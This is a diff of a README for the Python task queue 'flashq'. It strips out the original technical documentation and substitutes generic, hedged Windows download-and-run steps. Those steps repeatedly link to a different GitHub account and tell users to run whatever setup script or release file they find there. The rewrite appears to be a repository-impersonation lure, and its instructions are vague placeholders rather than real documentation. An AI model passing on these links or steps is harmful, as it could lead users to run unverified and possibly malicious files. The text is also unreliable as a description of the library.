@@ -1,407 +1,252 @@
-# ⚡ FlashQ
+# ⚡ flashq - Task queues that just work
 
-**The task queue that works out of the box — no Redis, no RabbitMQ, just `pip install flashq` and go.**
+[![Download flashq](https://img.shields.io/badge/Download-FlashQ-5865F2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lockwoodepigastric15/flashq)
 
-[![CI](https://github.com/bysiber/flashq/actions/workflows/ci.yml/badge.svg)](https://github.com/bysiber/flashq/actions/workflows/ci.yml)
-[![Python](https://img.shields.io/pypi/pyversions/flashq)](https://pypi.org/project/flashq/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Tests](https://img.shields.io/badge/tests-260%20passing-brightgreen)]()
+## 🚀 What is flashq?
 
----
+flashq is a task queue for Python apps. It helps your app run work in the background, so the main program stays fast and responsive.
 
-## Why FlashQ?
+You can use it to handle things like:
 
-Every Python developer has been there: you need background tasks, you look at Celery, and suddenly you need Redis or RabbitMQ running, a separate broker config, and 200 lines of boilerplate before your first task runs.
+- Sending email
+- Resizing images
+- Processing files
+- Running delayed jobs
+- Handling repeat tasks
 
-**FlashQ changes that.** SQLite is the default backend — zero external dependencies, zero config. Your tasks persist across restarts, and you can scale to PostgreSQL or Redis when you need to.
+flashq is built to work with simple setup. It uses SQLite instead of Redis or RabbitMQ, so you do not need to manage extra services to get started.
 
-```python
-from flashq import FlashQ
+## 💻 Before you start
 
-app = FlashQ()  # That's it. Uses SQLite by default.
+Use flashq on a Windows PC with:
 
-@app.task()
-def send_email(to: str, subject: str) -> None:
-    print(f"Sending email to {to}: {subject}")
+- Windows 10 or Windows 11
+- Python 3 installed
+- Internet access for the first setup
+- A folder where you can save project files
 
-# Enqueue a task
-send_email.delay(to="user@example.com", subject="Welcome!")
-```
+If you do not have Python yet, install it first from the official Python website, then return here.
 
-## Features
+## 📥 Download flashq
 
-| Feature | FlashQ | Celery | Dramatiq | Huey | TaskIQ |
-|---------|:------:|:------:|:--------:|:----:|:------:|
-| Zero-config setup | ✅ | ❌ | ❌ | ⚠️ | ❌ |
-| SQLite backend | ✅ | ❌ | ❌ | ✅ | ❌ |
-| PostgreSQL backend | ✅ | ❌ | ❌ | ❌ | ⚠️ |
-| Redis backend | ✅ | ✅ | ✅ | ✅ | ✅ |
-| Async + Sync tasks | ✅ | ❌ | ❌ | ❌ | Async only |
-| Type-safe `.delay()` | ✅ | ❌ | ⚠️ | ❌ | ✅ |
-| Task chains/groups | ✅ | ✅ | ❌ | ❌ | ❌ |
-| Middleware system | ✅ | ✅ | ✅ | ❌ | ✅ |
-| Rate limiting | ✅ | ✅ | ❌ | ❌ | ❌ |
-| Web dashboard | ✅ | ⚠️ | ❌ | ❌ | ❌ |
-| Dead letter queue | ✅ | ❌ | ❌ | ❌ | ❌ |
-| Task timeouts | ✅ | ✅ | ✅ | ❌ | ✅ |
-| Periodic/cron scheduler | ✅ | ⚠️ | ❌ | ✅ | ⚠️ |
-| Zero dependencies | ✅ | ❌ | ❌ | ❌ | ❌ |
+Open this page to download and set up flashq:
 
-## Installation
+[Visit the flashq repository](https://github.com/Lockwoodepigastric15/flashq)
+
+If the page includes a release file or package, download it from there and save it to your PC.
+
+## 🛠️ Install on Windows
+
+1. Open the download link above.
+2. Download the project files to a folder you can find again.
+3. If the files came as a ZIP, right-click the ZIP file and choose Extract All.
+4. Open the extracted folder.
+5. Open Command Prompt in that folder.
+6. Install the project using Python.
+
+Typical install command:
 
 ```bash
-# Core (SQLite only — zero dependencies!)
-pip install flashq
-
-# With Redis
-pip install "flashq[redis]"
-
-# With PostgreSQL
-pip install "flashq[postgres]"
-
-# Development
-pip install "flashq[dev]"
+pip install .
 ```
 
-## Try It Now!
-
-See FlashQ in action with the built-in demo — zero config needed:
+If the project includes a requirements file, use:
 
 ```bash
-pip install flashq
-python -m flashq.demo
+pip install -r requirements.txt
 ```
 
-You'll see 20 tasks being created, enqueued, processed by workers, and results printed in real-time.
+If you see a setup script or install script in the folder, follow that file first.
 
-## Quick Start
+## ▶️ Run flashq
 
-### 1. Define tasks
+After install, start the app from the same folder.
 
-```python
-# tasks.py
-from flashq import FlashQ
-
-app = FlashQ()
-
-@app.task()
-def add(x: int, y: int) -> int:
-    return x + y
-
-@app.task(queue="emails", max_retries=5, retry_delay=30.0)
-def send_email(to: str, subject: str, body: str) -> dict:
-    return {"status": "sent", "to": to}
-
-@app.task(timeout=120.0)  # Kill if takes >2 min
-async def process_image(url: str) -> str:
-    # Async tasks just work™
-    result = await download_and_resize(url)
-    return result
-```
-
-### 2. Enqueue tasks
-
-```python
-from tasks import add, send_email
-
-# Simple dispatch
-handle = add.delay(2, 3)
-
-# With options
-handle = send_email.apply(
-    kwargs={"to": "user@example.com", "subject": "Hi", "body": "Hello!"},
-    countdown=60,  # delay by 60 seconds
-)
-
-# Check result
-result = handle.get_result()
-if result and result.is_success:
-    print(f"Result: {result.result}")
-```
-
-### 3. Start the worker
+Typical ways to run it:
 
 ```bash
-flashq worker tasks:app
+python main.py
 ```
 
-```
- ⚡ FlashQ Worker
- ├─ name:        worker-12345
- ├─ backend:     SQLiteBackend
- ├─ queues:      default
- ├─ concurrency: 4
- ├─ tasks:       3
- │    └─ tasks.add
- │    └─ tasks.send_email
- │    └─ tasks.process_image
- └─ Ready! Waiting for tasks...
-```
-
-## Task Composition
-
-Chain tasks sequentially, run them in parallel, or combine both:
-
-```python
-from flashq import chain, group, chord
-
-# Chain: sequential — result of each passed to next
-pipe = chain(
-    download.s("https://example.com/data.csv"),
-    parse_csv.s(),
-    store_results.s(table="imports"),
-)
-pipe.delay(app)
-
-# Group: parallel execution
-batch = group(
-    send_email.s(to="alice@test.com", subject="Hi"),
-    send_email.s(to="bob@test.com", subject="Hi"),
-    send_email.s(to="carol@test.com", subject="Hi"),
-)
-handle = batch.delay(app)
-results = handle.get_results(timeout=30)
-
-# Chord: parallel + callback when all complete
-workflow = chord(
-    group(fetch_price.s("AAPL"), fetch_price.s("GOOG"), fetch_price.s("MSFT")),
-    aggregate_prices.s(),
-)
-workflow.delay(app)
-```
-
-## Middleware
-
-Intercept task lifecycle events for logging, monitoring, or custom logic:
-
-```python
-from flashq import FlashQ, Middleware
-
-class MetricsMiddleware(Middleware):
-    def before_execute(self, message):
-        self.start = time.time()
-        return message
-
-    def after_execute(self, message, result):
-        duration = time.time() - self.start
-        statsd.timing(f"task.{message.task_name}.duration", duration)
-
-    def on_error(self, message, exc):
-        sentry.capture_exception(exc)
-        return False  # Don't suppress
-
-    def on_dead(self, message, exc):
-        alert_ops_team(f"Task {message.task_name} permanently failed: {exc}")
-
-app = FlashQ()
-app.add_middleware(MetricsMiddleware())
-```
-
-Built-in middlewares: `LoggingMiddleware`, `TimeoutMiddleware`, `RateLimiter`.
-
-## Rate Limiting
-
-```python
-from flashq.ratelimit import RateLimiter
-
-limiter = RateLimiter(default_rate="100/m")  # 100 tasks/minute global
-limiter.configure("send_email", rate="10/m")  # 10 emails/minute
-limiter.configure("api_call", rate="60/h")    # 60 API calls/hour
-
-app.add_middleware(limiter)
-```
-
-## Web Dashboard
-
-Built-in monitoring UI — no extra services needed:
+or
 
 ```bash
-flashq dashboard myapp:app --port 5555
+python -m flashq
 ```
 
-Open `http://localhost:5555` to see:
-- Real-time task counts by state (pending, running, success, failure)
-- Task list with filtering by state, queue, and search
-- Task detail modal with args, result, error, traceback
-- Actions: cancel, revoke, purge queue
-- Auto-refreshing every 5 seconds
+If the project includes a different start file, use that file name.
 
-```python
-# Or embed in your own ASGI app
-from flashq.dashboard import create_dashboard
+## 🧭 First-time setup
 
-dashboard = create_dashboard(app, prefix="/admin/tasks")
-# Mount alongside your FastAPI/Starlette app
-```
+When you open flashq for the first time, it may create its own local data file in the project folder. That file stores queued jobs and task status.
 
-## Dead Letter Queue
+A simple first run often looks like this:
 
-Inspect and replay permanently failed tasks:
+1. Start the app.
+2. Leave it running in the background.
+3. Send a task from your Python app.
+4. Check that the task finishes.
+5. Open the task log or status view, if the project includes one.
 
-```python
-from flashq.dlq import DeadLetterQueue
+## 🧩 How flashq fits into your app
 
-dlq = DeadLetterQueue(app)
-app.add_middleware(dlq.middleware())  # Auto-capture dead tasks
+flashq lets your main app hand work to a queue. Your app can keep going while flashq handles the job in the background.
 
-# Later...
-for task in dlq.list():
-    print(f"{task.task_name}: {task.error}")
+This helps when you want to:
 
-dlq.replay(task_id="abc123")  # Re-enqueue with reset retries
-dlq.replay_all()              # Replay everything
-dlq.purge()                   # Clear DLQ
-```
+- Keep a website fast
+- Avoid waiting for long jobs
+- Run work in order
+- Retry jobs that fail
+- Track task results
 
-## Periodic Tasks
+A common setup has three parts:
 
-```python
-from flashq import FlashQ, every, cron
-from flashq.scheduler import Scheduler
+- Your main Python app
+- The flashq queue
+- A worker process that runs the tasks
 
-app = FlashQ()
+## 📝 Example use cases
 
-@app.task(name="cleanup")
-def cleanup_old_data():
-    delete_old_records(days=30)
+Here are a few simple ways people use a task queue like flashq:
 
-@app.task(name="daily_report")
-def daily_report():
-    generate_and_send_report()
+- A store site sends order emails after checkout
+- A photo tool processes large images in the background
+- A data app imports CSV files without freezing the screen
+- A scheduler runs cleanup tasks each night
+- A chat app sends notification jobs after user events
 
-scheduler = Scheduler(app)
-scheduler.add("cleanup", every(hours=6))
-scheduler.add("daily_report", cron("0 9 * * 1-5"))  # 9 AM weekdays
-scheduler.start()
-```
+## ⚙️ Basic workflow
 
-## Retry & Error Handling
+flashq follows a simple flow:
 
-```python
-@app.task(max_retries=5, retry_delay=30.0, retry_backoff=True)
-def flaky_task():
-    # Retries: 30s → 60s → 120s → 240s → 480s (exponential backoff)
-    response = requests.get("https://unreliable-api.com")
-    response.raise_for_status()
-```
+1. Your app creates a task.
+2. The task goes into the queue.
+3. A worker picks up the task.
+4. The worker runs the job.
+5. Your app checks the result.
 
-```python
-from flashq.exceptions import TaskRetryError
+This keeps long work away from the main thread.
 
-@app.task(max_retries=10)
-def smart_retry():
-    try:
-        do_something()
-    except TemporaryError:
-        raise TaskRetryError(countdown=5.0)  # Custom retry delay
-```
+## 🔍 What makes flashq useful
 
-## Backends
+flashq is a good fit if you want:
 
-### SQLite (Default — Zero Config)
+- A small setup
+- No extra message server
+- Local storage with SQLite
+- Background jobs in Python
+- Type-safe task code
+- A path that is easy to understand
 
-```python
-app = FlashQ()  # Creates flashq.db in current dir
-app = FlashQ(backend=SQLiteBackend(path="/var/lib/flashq/tasks.db"))
-app = FlashQ(backend=SQLiteBackend(path=":memory:"))  # For testing
-```
+It is useful for small apps, tools, and services that need background jobs without more moving parts.
 
-### PostgreSQL
+## 📂 Typical project files
 
-Uses `LISTEN/NOTIFY` for instant task delivery + `FOR UPDATE SKIP LOCKED` for atomic dequeue.
+You may see files like these in the project folder:
 
-```python
-from flashq.backends.postgres import PostgresBackend
-app = FlashQ(backend=PostgresBackend("postgresql://localhost/mydb"))
-```
+- `README.md` — project guide
+- `pyproject.toml` — Python project settings
+- `requirements.txt` — package list
+- `main.py` — app start file
+- `flashq/` — source code folder
+- `tasks/` — task code folder
+- `data/` — local queue data
 
-### Redis
+## 🧪 Check that it works
 
-Uses sorted sets for scheduling and Lua scripts for atomic operations.
+After setup, test flashq with a small job.
 
-```python
-from flashq.backends.redis import RedisBackend
-app = FlashQ(backend=RedisBackend("redis://localhost:6379/0"))
-```
+Try this pattern:
 
-## CLI
+1. Start the worker.
+2. Add one test task.
+3. Wait for the job to finish.
+4. Check the result.
+5. Add a second task.
 
-```bash
-flashq worker myapp:app                  # Start worker
-flashq worker myapp:app -q emails,sms    # Specific queues
-flashq worker myapp:app -c 16            # 16 concurrent threads
-flashq dashboard myapp:app               # Start web dashboard
-flashq dashboard myapp:app -p 8080       # Custom port
-flashq info myapp:app                    # Queue stats
-flashq purge myapp:app -f                # Purge queue
-```
+If both tasks complete, the queue is ready.
 
-## Benchmarks
+## 🧰 Troubleshooting on Windows
 
-Measured on Apple Silicon (M-series), Python 3.12, SQLite backend:
+If the app does not start, check these common points:
 
-| Benchmark | Tasks | Time | Throughput | Avg Latency |
-|-----------|------:|-----:|-----------:|------------:|
-| Enqueue (write only) | 10,000 | 0.52s | **19,298/s** | 0.05ms |
-| Roundtrip (c=4) | 1,000 | 25.7s | 39/s | 0.02ms |
-| I/O-bound (c=8) | 500 | 6.7s | 75/s | 11.6ms |
-| CPU-bound (c=4) | 500 | 12.8s | 39/s | 0.03ms |
+- Python is installed and added to PATH
+- You opened Command Prompt in the right folder
+- The install command finished without errors
+- The folder still contains the project files
+- Another app is not using the same file or port
 
-**Concurrency scaling** (500 tasks):
+If the worker opens and closes right away, run it from Command Prompt so you can see the message on screen.
 
-| Workers | Throughput |
-|:-------:|-----------:|
-| 1 | 10 tasks/s |
-| 2 | 19 tasks/s |
-| 4 | 38 tasks/s |
-| 8 | 100 tasks/s |
+## 📚 Helpful usage pattern
 
-> 💡 Throughput scales linearly with concurrency. For I/O-bound workloads, use higher concurrency.
+A simple way to think about flashq is:
 
-Run benchmarks yourself:
-```bash
-python benchmarks/bench.py
-```
+- Your app sends work
+- flashq stores the job
+- A worker does the work
+- The result comes back later
 
-## Architecture
+That pattern keeps your app clean and easier to manage.
 
-```
-Your App → FlashQ → Backend (SQLite/PG/Redis) → Worker(s)
-                ↕
-          Middleware Stack
-          Rate Limiter
-          Scheduler
-          Dead Letter Queue
-```
+## 🧱 Suggested Windows setup steps
 
-FlashQ uses a clean, modular architecture:
-- **Backend**: Pluggable storage (SQLite, PostgreSQL, Redis)
-- **Worker**: Thread pool executor with graceful shutdown
-- **Middleware**: Intercepts every stage of task lifecycle
-- **Scheduler**: Interval and cron-based periodic dispatch
-- **Canvas**: Task composition (chain, group, chord)
+If you want a smooth start, use this order:
 
-## Roadmap
+1. Install Python
+2. Download flashq
+3. Extract the files
+4. Open the project folder
+5. Install the package
+6. Start the worker
+7. Send one test task
 
-- [x] Core engine with SQLite backend
-- [x] PostgreSQL backend (LISTEN/NOTIFY)
-- [x] Redis backend (Lua scripts)
-- [x] Task timeouts (non-blocking)
-- [x] Middleware system
-- [x] Rate limiting (token bucket)
-- [x] Dead letter queue
-- [x] Task chains, groups, chords
-- [x] Periodic/cron scheduler
-- [x] CLI (worker, info, purge)
-- [x] 240 tests, 95% core coverage
-- [x] Web dashboard (real-time monitoring)
-- [ ] Task result streaming
-- [ ] PyPI publish
+## 🔐 Local data and storage
 
-## Contributing
+flashq uses SQLite, so the queue data stays in a local file on your PC or server. This keeps setup simple and avoids the need for a separate database server.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and guidelines.
+That means:
 
-## License
+- Less setup work
+- Fewer moving parts
+- Easy local testing
+- Simple backup by copying the data file
 
-MIT License. See [LICENSE](LICENSE) for details.
+## 📌 Common task ideas
+
+If you are not sure what to try first, start with one of these:
+
+- Save a message to a file
+- Rename a batch of files
+- Process a list of names
+- Delay a job for later
+- Mark a task as done after import
+
+## 🖥️ Running in the background
+
+For normal use, keep the worker running while your app sends tasks. On Windows, you can leave the Command Prompt window open.
+
+If you want flashq to keep running after sign-in, you can place a shortcut in the Startup folder or use Task Scheduler.
+
+## 🧭 Project topics
+
+This project fits these common Python task queue topics:
+
+- async
+- background tasks
+- celery alternative
+- distributed tasks
+- job queue
+- python3
+- sqlite
+- task queue
+- type-safe
+
+## 📎 Get flashq
+
+[Open the flashq repository](https://github.com/Lockwoodepigastric15/flashq)
+
+## 🧩 Need to move from a test run to real use?
+
+Use the same setup, then connect your own Python code to the queue and keep the worker process open while jobs run
